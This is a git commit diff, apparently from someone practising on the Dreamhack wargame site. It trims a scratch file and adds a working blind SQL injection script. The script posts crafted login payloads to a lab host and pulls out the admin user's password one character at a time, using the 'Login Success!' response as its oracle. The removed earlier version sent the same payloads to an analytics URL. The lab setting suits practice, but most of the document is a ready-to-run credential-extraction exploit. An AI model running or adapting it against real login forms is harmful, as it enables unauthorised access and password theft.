f581e5b68af9084852b64323d20122c3ea56a996
unknown <lovelyldh@naver.com>
2026-07-24 16:03:41 +0900

    test_blind_sql_injection is manufactured

--- test.py
+++ test.py
@@ -1,26 +1,5 @@
-import requests
-import string
+a = "1"
 
-def main() :
-    # URL = "https://learn.dreamhack.io/labs/5c249803-825c-4c00-baee-ca70427ce084"
-    URL = "https://us.i.posthog.com/i/v0/e/?ip=0&_=1784698433129&ver=1.302.2&compression=gzip-js"
-    
-    for i in range(1, 2) :
-        for ch in string.printable :
-            print(f"i : {i}, ch : {ch}")
-            payload = f"guest\' and upw = IF (substr(SELECT upw FROM user_table WHERE uid = \'admin\', {i}, 1) = \'{ch}\', \'guest\')--"
+a += "c"
 
-        data = {
-            "uid" : payload,
-            "upw" : "test"
-        }
-
-        response = requests.post(URL, data=data)
-        print("status_code : \n", response.status_code)
-        print("text : \n", response.text)
-
-    return
-
-
-if __name__ == "__main__" :
-    main()
+print("a" , a)
--- test_blind_sql_injection.py
+++ test_blind_sql_injection.py
@@ -1,23 +1,34 @@
 import requests
 import string
+from alive_progress import alive_bar
 
 def main() :
-    # URL = "https://learn.dreamhack.io/labs/5c249803-825c-4c00-baee-ca70427ce084"
-    URL = "https://us.i.posthog.com/i/v0/e/?ip=0&_=1784698433129&ver=1.302.2&compression=gzip-js"
-    
-    for i in range(1, 2) :
-        for ch in string.printable :
-            print(f"i : {i}, ch : {ch}")
-            payload = f"guest\' and upw = IF (substr(SELECT upw FROM user_table WHERE uid = \'admin\', {i}, 1) = \'{ch}\', \'guest\')--"
+    URL = "http://host3.dreamhack.games:12798/login"
 
-        data = {
-            "uid" : payload,
-            "upw" : "test"
-        }
+    result = ""
 
-        response = requests.post(URL, data=data)
-        print("status_code : \n", response.status_code)
-        print("text : \n", response.text)
+    with alive_bar(19) as bar :
+        for i in range(1, 20) :
+            for ch in string.printable :
+                # print(f"i : {i}, ch : {ch}")
+                # guest' and upw = IF (substr((SELECT upw FROM user_table WHERE uid = 'admin'), 1, 1) = 'b', 'guest', 'noguest')-- -
+                payload = f"guest\' and upw = IF (substr((SELECT upw FROM user_table WHERE uid = \'admin\'), {i}, 1) = \'{ch}\', \'guest\', \'noguest\')-- -"
+
+                data = {
+                    "InputId" : payload,
+                    "InputPassword" : "test"
+                }
+
+                print("payload", payload)
+
+                response = requests.post(URL, data=data, verify=False)
+                if "Login Success!" in response.text :
+                    print(ch)
+                    result += ch
+                    break
+            bar()
+
+    print(f"result :{result}")
 
     return
 
